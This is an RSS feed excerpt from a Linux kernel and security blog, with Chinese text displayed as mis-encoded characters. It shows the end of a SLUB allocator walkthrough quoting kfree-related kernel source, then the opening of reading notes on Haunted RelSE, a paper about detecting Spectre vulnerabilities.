slab);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è‹¥ä¸æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶ï¼Œåˆ™æ£€æŸ¥æ˜¯å¦æ²¡æœ‰ percpu partial slab ä¸” slab ä¸ŠåŸ freelist ä¸º NULLï¼ˆå³ä½äº node full é“¾è¡¨ï¼‰ï¼Œè‹¥æ˜¯åˆ™ä» full é“¾è¡¨ç§»é™¤å¹¶æ·»åŠ åˆ° node partial é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Objects left in the slab. If it was not on the partial list before</span><br><span class="hljs-comment"> * then add it.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;<br>remove_full(s, n, slab);<br>add_partial(n, slab, DEACTIVATE_TO_TAIL);<br>stat(s, FREE_ADD_PARTIAL);<br>&#125;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œ slub ç®—æ³•çš„é‡Šæ”¾é€»è¾‘åˆ†æå®Œæ¯•</p><h2 id="äºŒã€kfreeï¼šé€šç”¨çš„ä¸Šå±‚é‡Šæ”¾æ¥å£"><a href="#äºŒã€kfreeï¼šé€šç”¨çš„ä¸Šå±‚é‡Šæ”¾æ¥å£" class="headerlink" title="äºŒã€kfreeï¼šé€šç”¨çš„ä¸Šå±‚é‡Šæ”¾æ¥å£"></a>äºŒã€kfreeï¼šé€šç”¨çš„ä¸Šå±‚é‡Šæ”¾æ¥å£</h2><p>æ­£å¦‚åŒ <code>kmalloc()</code> æ˜¯æœ€ä¸ºé€šç”¨çš„å†…æ ¸å¯¹è±¡åˆ†é…å‡½æ•°ï¼Œä¸ä¹‹ç›¸å¯¹åº”çš„é‡Šæ”¾å‡½æ•°ä¾¿æ˜¯ <code>kfree()</code> äº†ï¼Œè¿™ä¸ªå‡½æ•°å…¶å®ä¸»è¦å°±æ˜¯ <code>__kmem_cache_free()</code> çš„ wrapperï¼Œå¯¹äºè¾ƒå¤§çš„å¯¹è±¡åˆ™ä¼šç”¨ <code>free_large_kmalloc()</code> è¿›è¡Œé‡Šæ”¾ï¼Œå¦‚æœ object ä¸º NULL åˆ™ç›´æ¥è¿”å›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kfree - é‡Šæ”¾ä¹‹å‰åˆ†é…çš„å¯¹è±¡</span><br><span class="hljs-comment"> * @object: kmalloc è¿”å›çš„æŒ‡é’ˆ.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥ @object ä¸º NULL, åˆ™ä¸ä¼šè¿›è¡Œä»»ä½•æ“ä½œ.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä¸è¦é‡Šæ”¾ä¸ç”± kmalloc() åˆ†é…çš„å†…å­˜ï¼Œå¦åˆ™ä¼šå‡ºé—®é¢˜.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio</span> *<span class="hljs-title">folio</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><br>trace_kfree(_RET_IP_, object);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object)))<br><span class="hljs-keyword">return</span>;<br><br>folio = virt_to_folio(object);<br><span class="hljs-keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;<br>free_large_kmalloc(folio, (<span class="hljs-type">void</span> *)object);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>slab = folio_slab(folio);<br>s = slab-&gt;slab_cache;<br>__kmem_cache_free(s, (<span class="hljs-type">void</span> *)object, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(kfree);<br></code></pre></td></tr></table></figure><h3 id="I-folio-ç»“æ„ï¼šä¸€æ®µç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜"><a href="#I-folio-ç»“æ„ï¼šä¸€æ®µç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜" class="headerlink" title="I. folio ç»“æ„ï¼šä¸€æ®µç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜"></a>I. folio ç»“æ„ï¼šä¸€æ®µç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜</h3><p>æ³¨æ„åˆ°è¿™é‡Œç”¨äº†ä¸€ä¸ªåä¸º <code>folio</code> çš„ç»“æ„ä½“ï¼Œå…¶è¡¨ç¤ºäº†<strong>ä¸€å—ç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜</strong>ï¼Œ  <em>å…¶å®æœ¬è´¨ä¸Šè¿˜æ˜¯å¤ç”¨äº† page ç»“æ„ä½“ï¼Œåªä¸è¿‡è¿™ä¸€æ¬¡æ˜¯å°† page è½¬ä¸º folio</em>  ï¼Œå®šä¹‰æ¯”è¾ƒé•¿è¿™é‡Œå°±ä¸è´´ä»£ç äº†</p><p><code>virt_to_folio()</code> é¦–å…ˆä¼šç”¨ <code>virt_to_page()</code> æ‰¾åˆ°å¾…é‡Šæ”¾å¯¹è±¡è™šæ‹Ÿåœ°å€å¯¹åº”çš„ <code>page</code> ç»“æ„ä½“ï¼Œä¹‹åç”¨ <code>page_folio()</code> å°†å…¶è½¬æ¢ä¸º folio ç»“æ„ä½“â€”â€”å…¶å®å°±æ˜¯å¯¹äºå¤åˆé¡µè€Œè¨€ä¼šæ‰¾åˆ°ç¬¬ä¸€å¼ é¡µé¢ï¼Œç”±æ­¤å¦‚æœæ˜¯å¤åˆé¡µçš„è¯é‚£è¯´æ˜æ˜¯å¤§ slab æ‰€ä»¥ä¼šè°ƒç”¨ <code>free_large_kmalloc()</code>ï¼Œä¸æ˜¯å¤åˆé¡µè¯´æ˜æ˜¯å° slab æ‰€ä»¥ä¼šè°ƒç”¨ <code>__kmem_cache_free()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> folio *<span class="hljs-title function_">virt_to_folio</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *x)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> virt_to_page(x);<br><br><span class="hljs-keyword">return</span> page_folio(page);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> page_folio(p)(_Generic((p),\</span><br><span class="hljs-meta">const struct page *:(const struct folio *)_compound_head(p), \</span><br><span class="hljs-meta">struct page *:(struct folio *)_compound_head(p)))</span><br></code></pre></td></tr></table></figure><p>ç„¶å <code>folio_test_slab()</code> å…¶å®æ˜¯ <code>include/linux/page-flags.h</code> é‡Œçš„æ‹¼æ¥å®ï¼Œè¿™é‡Œå°±ä¸æ·±å…¥å±•å¼€äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">bool</span> folio_test_#<span class="hljs-meta">#lname(struct folio *folio)\</span><br><span class="hljs-meta">&#123; return test_bit(PG_##lname, folio_flags(folio, FOLIO_##policy)); &#125;\</span><br></code></pre></td></tr></table></figure><h3 id="II-free-large-kmalloc-ï¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å›-buddy-system"><a href="#II-free-large-kmalloc-ï¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å›-buddy-system" class="headerlink" title="II. free_large_kmalloc()ï¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å› buddy system"></a>II. free_large_kmalloc()ï¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å› buddy system</h3><p>æ­£å¦‚å¯¹äºå¤§å¯¹è±¡çš„åˆ†é… <code>kmalloc_large()</code> ä¼šç›´æ¥ä» buddy system è¯·æ±‚å†…å­˜ä¸€èˆ¬ï¼Œç›¸å¯¹åº”çš„ <code>free_large_kmalloc()</code> ä¹Ÿä¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å› buddy systemï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_large_kmalloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> folio *folio, <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = folio_order(folio);<br><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(order == <span class="hljs-number">0</span>))<br>pr_warn_once(<span class="hljs-string">&quot;object pointer: 0x%p\n&quot;</span>, object);<br><br>kmemleak_free(object);<br>kasan_kfree_large(object);<br>kmsan_kfree_large(object);<br><br>mod_lruvec_page_state(folio_page(folio, <span class="hljs-number">0</span>), NR_SLAB_UNRECLAIMABLE_B,<br>      -(PAGE_SIZE &lt;&lt; order));<br>__free_pages(folio_page(folio, <span class="hljs-number">0</span>), order);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmem-cache-free-ï¼šå¸¸è§„çš„é‡Šæ”¾å‡½æ•°"><a href="#III-kmem-cache-free-ï¼šå¸¸è§„çš„é‡Šæ”¾å‡½æ•°" class="headerlink" title="III. __kmem_cache_free()ï¼šå¸¸è§„çš„é‡Šæ”¾å‡½æ•°"></a>III. __kmem_cache_free()ï¼šå¸¸è§„çš„é‡Šæ”¾å‡½æ•°</h3><p><code>__kmem_cache_free()</code> ä¸»è¦å°±æ˜¯å¯¹ <code>slab_free()</code> çš„ wrapperï¼Œä¸è¿‡ä¼šæŒ‡å®š tail ä¸º NULLï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __kmem_cache_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *x, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br>slab_free(s, virt_to_slab(x), x, <span class="hljs-literal">NULL</span>, &amp;x, <span class="hljs-number">1</span>, caller);<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ <code>slab_free()</code> åˆ™ä¼šæœ€ç»ˆè°ƒç”¨åˆ° <code>do_slab_free()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> <span class="hljs-title function_">slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">      <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">void</span> **p, <span class="hljs-type">int</span> cnt,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br>memcg_slab_free_hook(s, slab, p, cnt);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * With KASAN enabled slab_free_freelist_hook modifies the freelist</span><br><span class="hljs-comment"> * to remove objects, whose reuse must be delayed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))<br>do_slab_free(s, slab, head, tail, cnt, addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªå‡½æ•° <code>slab_free_freelist_hook()</code>ï¼Œä¸»è¦çš„ä½œç”¨æ˜¯éå†å¾…é‡Šæ”¾çš„ freelistï¼š</p><ul><li>å¦‚æœè®¾ç½®äº† free hookï¼ˆ <code>slab_free_hook() == true</code> ï¼‰ï¼Œåˆ™ä»…å‡å°‘è®¡æ•°ä»¥æ¨è¿Ÿé‡Šæ”¾</li><li>å¦åˆ™é‡æ–°å»ºç«‹ä¸€é freelist åè¿”å›</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">slab_free_freelist_hook</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params">   <span class="hljs-type">void</span> **head, <span class="hljs-type">void</span> **tail,</span><br><span class="hljs-params">   <span class="hljs-type">int</span> *cnt)</span><br>&#123;<br><br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">void</span> *next = *head;<br><span class="hljs-type">void</span> *old_tail = *tail ? *tail : *head;<br><br><span class="hljs-keyword">if</span> (is_kfence_address(next)) &#123;<br>slab_free_hook(s, next, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">/* Head and tail of the reconstructed freelist */</span><br>*head = <span class="hljs-literal">NULL</span>;<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">do</span> &#123;<br>object = next;<br>next = get_freepointer(s, object);<br><br><span class="hljs-comment">/* If object&#x27;s reuse doesn&#x27;t have to be delayed */</span><br><span class="hljs-keyword">if</span> (!slab_free_hook(s, object, slab_want_init_on_free(s))) &#123;<br><span class="hljs-comment">/* Move object to the new freelist */</span><br>set_freepointer(s, object, *head);<br>*head = object;<br><span class="hljs-keyword">if</span> (!*tail)<br>*tail = object;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adjust the reconstructed freelist depth</span><br><span class="hljs-comment"> * accordingly if object&#x27;s reuse is delayed.</span><br><span class="hljs-comment"> */</span><br>--(*cnt);<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (object != old_tail);<br><br><span class="hljs-keyword">if</span> (*head == *tail)<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> *head != <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾-1"><a href="#ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾-1" class="headerlink" title="ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾"></a>ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾</h2><p>æ¶‰åŠåˆ°å†…å­˜é‡Šæ”¾çš„å‡½æ•°ç›¸è¾ƒäºå†…å­˜åˆ†é…å…¶å®å°‘å¾ˆå¤šï¼Œå¸¸ç”¨çš„ä¸»è¦å°±æ˜¯ <code>kfree()</code>ã€<code>kfree_sensitive()</code>ã€<code>kmem_cache_free()</code> è¿™ä¸‰å¤§å‡½æ•°ï¼š</p><p><img src="https://s2.loli.net/2023/02/24/Itbqo2eO15yn7ZW.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åˆ«äººé—®ä½ å“ªé‡Œä¸‘æ€ä½ å†æŠŠä»–åæ‰‹æŒ‚åˆ°è‡ªå·±çš„å° slub é‡Œå¯»æ±‚è®¤åŒ&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="å†…å­˜ç®¡ç†" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="slub allocator" scheme="http://blog.arttnba3.cn/tags/slub-allocator/"/>
    
  </entry>
  
  <entry>
    <title>ã€PAPER.0x01ã€‘è®ºæ–‡ç¬”è®°ï¼šHunting the Haunter â€” Efficient Relational Symbolic Execution for Spectre with Haunted RelSE </title>
    <link href="http://blog.arttnba3.cn/2023/01/29/PAPER-0X01-HUNTING_THE_HAUNTER-EFFICIENT_RELATIONAL_SYMBOLIC_EXECUTION_FOR_SPECTRE_WITH_HAUNTED_RELSE/"/>
    <id>http://blog.arttnba3.cn/2023/01/29/PAPER-0X01-HUNTING_THE_HAUNTER-EFFICIENT_RELATIONAL_SYMBOLIC_EXECUTION_FOR_SPECTRE_WITH_HAUNTED_RELSE/</id>
    <published>2023-01-28T18:37:51.000Z</published>
    <updated>2023-04-23T16:40:42.749Z</updated>
    
    <content type="html"><![CDATA[<p>é¬¼ï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>æœ¬æ ¡åœ¨æ¯•è®¾ä¹‹å‰è¿˜æœ‰ä¸ªâ€œå°æ¯•è®¾â€â€”â€”<code>ç½‘ç»œç©ºé—´å®‰å…¨ç»¼åˆå®éªŒ</code> ï¼Œåˆšå¥½ç¬”è€…è¦åšçš„é¢˜ç›®æ˜¯åŸºäºè¿™ç¯‡è®ºæ–‡å®Œæˆçš„ï¼Œæ‰€ä»¥è¿˜æ˜¯ç®€å•å†™ä¸€ä¸ªé˜…è¯»ç¬”è®°ï¼šï¼‰</p><blockquote><p>è¯´æ˜¯ç¬”è®°ï¼Œå…¶å®è¿˜æ˜¯å·®ä¸å¤šç›¸å½“äºæŠŠåŸæ–‡ç¿»è¯‘äº†ä¸€éï¼ˆï¼ˆï¼ˆ</p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><strong>Spectre</strong> æ˜¯ä¸€ç§å¾®æ¶æ„å±‚é¢çš„æ¼æ´ï¼Œå…¶å…è®¸æ”»å‡»è€…åˆ©ç”¨æ¨æµ‹æ‰§è¡Œï¼ˆspeculation executinoï¼‰æŠ€æœ¯ä¸­çš„æ¼æ´æ¥æ³„éœ²ä¿¡æ¯ï¼Œä½†å¯¹äºè¯¥ç±»å‹æ¼æ´çš„æ£€æµ‹é¢ä¸´ç€ä¸¤ä¸ªæŒ‘æˆ˜ï¼šâ‘ æ¨æµ‹è·¯å¾„å¸¦æ¥çš„æœç´¢ç©ºé—´çˆ†ç‚¸â‘¡åœ¨ä¸åŒç¼–è¯‘é˜¶æ®µå¼•å…¥çš„ Spectre æ¼æ´</p><p>æœ¬æ–‡æå‡ºäº†åœ¨äºŒè¿›åˆ¶çº§çš„ Spectre æ¼æ´çš„é‡åŒ–æ£€æµ‹çš„ä¼˜åŒ–æ–¹æ³•ï¼š<code>Haunted RelSE</code>ï¼Œå¹¶è¯æ˜äº†ç›¸æ¯”äºåœ¨æœ€å…ˆè¿›çš„å·¥å…·ä¸­çš„æ›´æœ´ç´ çš„æ˜¾å¼æ¨æµ‹æ‰§è¡Œæ–¹æ³•ï¼ˆmore naive explicit speculative execution approachï¼‰ï¼Œè¯¥ä¼˜åŒ–æ˜¯è¯­ä¹‰æ­£ç¡®çš„</p><p>ç ”ç©¶è€…åœ¨ä¸€ä¸ªç¬¦å·åˆ†æå·¥å…·ä¸­åº”ç”¨äº† <code>Haunted RelSE</code> ï¼Œå¹¶åœ¨ä¸€ä¸ªæœ‰åçš„ Spectre-PHTï¼ˆSpectre v1ï¼‰ çš„ litmus tester ä¸Šè¿›è¡Œäº†æµ‹è¯•ï¼Œå¹¶æ‰“ç®—åœ¨ä¸€ä¸ªæ–°çš„ Spectre-STLï¼ˆSpectre v4ï¼‰çš„ litmus tester ä¸Šæµ‹è¯•</p><blockquote><p>litmus testï¼šå¯¹å†…å­˜ä¸€è‡´æ€§çš„æµ‹è¯•</p><blockquote><p>å¥½åƒæ²¡æœ‰å•¥ä¸­æ–‡ç¿»è¯‘ï¼Œç›¸å…³çš„ä¸­æ–‡èµ„æ–™ä¹Ÿå°‘ï¼Œæ‘¸äº†</p></blockquote></blockquote><p>è¯¥æŠ€æœ¯æ¯”æœ€å…ˆè¿›çš„å·¥å…·å‘ç°äº†æ›´å¤šçš„ violations ä¸ scalesï¼Œå¹¶è®©ç ”ç©¶è€…å‘ç°ï¼šå¯¹ Spectre-PHT çš„æ ‡å‡†é˜²æŠ¤æ‰‹æ®µ <code>index-masking</code> ä¸è‘—åçš„ç¼–è¯‘  <em>ä½ç½®æ— å…³çš„å¯æ‰§è¡Œæ–‡ä»¶</em>  ï¼ˆposition independent executablesï¼‰çš„ gcc é€‰é¡¹ï¼Œå¯¼è‡´äº† Spectre-STL çš„å¼•å…¥</p><p>ç ”ç©¶è€…æå‡ºå¹¶éªŒè¯äº†ä¸€ç§å¯¹ <code>index-masking</code> çš„ä¿®æ­£æ–¹æ³•</p><h1 id="0x01-INTRODUCTION"><a href="#0x01-INTRODUCTION" class="headerlink" title="0x01. INTRODUCTION"></a>0x01. INTRODUCTION</h1><p>ç°ä»£ CPU çš„æ‰§è¡Œé€Ÿåº¦ä¾èµ–äºåŒ…æ‹¬åˆ†æ”¯é¢„æµ‹å™¨ï¼ˆbranch predictorï¼‰ä¸ <em>æŠ•æœº</em> ï¼ˆ <em>speculation</em> ï¼‰åœ¨å†…çš„å¤æ‚ç¡¬ä»¶é€»è¾‘ï¼šæå‰æ‰§è¡ŒæŒ‡ä»¤ &amp; å°è¯•é€šè¿‡åˆ†æ”¯é¢„æµ‹å™¨æ¥æ¨æµ‹æ‰§è¡Œï¼ˆspeculatively executeï¼‰ä¸€æ¡æ§åˆ¶æµï¼Œè‹¥æ¨æµ‹å¤±è´¥åˆ™æ¢å¤è¢«å½±å“åŒºåŸŸâ€”â€”ç§°ä¸º  <em>æ¢å¤æ‰§è¡Œ</em> ï¼ˆReverted executionï¼Œä¹Ÿå«åš <em>ç¬æ€æ‰§è¡Œ</em> ï¼ˆtransient executionï¼‰ï¼Œæ„ä¸ºä»æ¶æ„è§’åº¦æ¥çœ‹è¿™ä¸ªæ“ä½œæ˜¯é€æ˜çš„ï¼‰</p><p>ä½†ç¬æ€æ‰§è¡Œä¼šåœ¨å¾®æ¶æ„çº§ï¼ˆmicroarchitectureï¼‰ç•™ä¸‹å¯è§‚æµ‹çš„ä¾§é¢å½±å“ï¼ˆside effectsï¼‰ï¼Œè€Œè¿™å¯ä»¥è¢«æ”»å‡»è€…ç”¨ä»¥æ¢å¤æ¶æ„çº§ï¼ˆarchitecturalï¼‰çš„ç§˜å¯†â€”â€”è¿™ç§æ”»å‡»æ‰‹æ³•ç§°ä¹‹ä¸º<strong>å¹½çµæ”»å‡»</strong>ï¼ˆSpectre attacksï¼‰</p><p>å¹½çµæœ‰ç€<a href="https://transient.fail/">å¤šç§å˜ç§</a>ï¼Œä½†ç»å¤§éƒ¨åˆ†çš„å·¥ä½œéƒ½ä»…å…³æ³¨äº  <code>Spectre-v1</code> ï¼ˆPattern History Tableï¼Œå¯¹æ¡ä»¶åˆ†æ”¯çš„æ”»å‡»ï¼‰ï¼Œä»…æœ‰ <a href="https://arxiv.org/pdf/1910.01755.pdf">Pitchfork</a> åšäº† <code>Spectre-v4</code> ï¼ˆStore to Loadï¼Œå¯¹å†…å­˜å±éšœé¢„æµ‹å™¨çš„æ”»å‡»ï¼‰çš„ç›¸å…³å·¥ä½œï¼Œä½†å¹¶ä¸å®Œå–„</p><h4 id="Goal-and-Challenge"><a href="#Goal-and-Challenge" class="headerlink" title="Goal and Challenge"></a>Goal and Challenge</h4><p>æœ¬ç¯‡è®ºæ–‡ä¸­ç ”ç©¶è€…æå‡ºäº†ä¸€ç§ç”¨ä»¥æ£€æµ‹ <code>Spectre-PHT</code> ä¸ <code>Spectre-STL</code> æ¼æ´çš„æ–¹æ³•ï¼Œå¹¶åº”ç”¨äºé™æ€äºŒè¿›åˆ¶ä»£ç åˆ†æä¸­ï¼Œè¿™é¢ä¸´ç€ä¸¤ä¸ªæŒ‘æˆ˜ï¼š</p><ul><li><strong>C1</strong>ï¼šå¾®æ¶æ„çš„ç»†èŠ‚åœ¨åˆ†æä¸­æ— æ³•è¢«å®Œå…¨è·å¾—ï¼Œéœ€è¦ä¸€ç§è¶³å¤Ÿå¼ºå¤§çš„æå–æ–¹æ³•ä»¥æå–é€ æˆä¾§ä¿¡é“æ”»å‡»çš„å¾®æ¶æ„çŠ¶æ€ï¼ˆmocroarchitectural stateï¼‰</li><li><strong>C2</strong>ï¼šå¯¹å¯èƒ½çš„æ¨æµ‹æ‰§è¡Œçš„æ¢ç´¢çš„è§„æ¨¡ä¸èƒ½å¤ªå¤§ï¼Œå¦åˆ™ä¼šé€ æˆçŠ¶æ€çˆ†ç‚¸ï¼ˆstate explosionï¼‰</li></ul><h4 id="Proposal"><a href="#Proposal" class="headerlink" title="Proposal"></a>Proposal</h4><p>æœ¬æ–‡é€šè¿‡åœ¨æ–‡çŒ®ä¸­åˆ›é€ çš„  <em>å…³ç³»å®‰å…¨å±æ€§</em>  ï¼ˆrelational security propertyï¼‰ä½œä¸º  <em>æ¨æµ‹å¸¸æ•°æ—¶é—´</em>  ï¼ˆspeculative constant-timeï¼‰æ¥åº”å¯¹æŒ‘æˆ˜ C1ã€‚æ¨æµ‹å¸¸æ•°æ—¶é—´åœ¨æ²¡æœ‰è¯¦ç»†å»ºæ¨¡å¤æ‚çš„å¾®æ¶æ„ç»†èŠ‚çš„æƒ…å†µä¸‹å°†æ¨æµ‹æ‰§è¡Œçº³å…¥è€ƒè™‘ï¼Œä½†ç¼–è¯‘å™¨æ²¡å¿…è¦ä¿æŠ¤å¸¸æ•°æ—¶é—´ç¼–ç¨‹ï¼ˆconstant-time 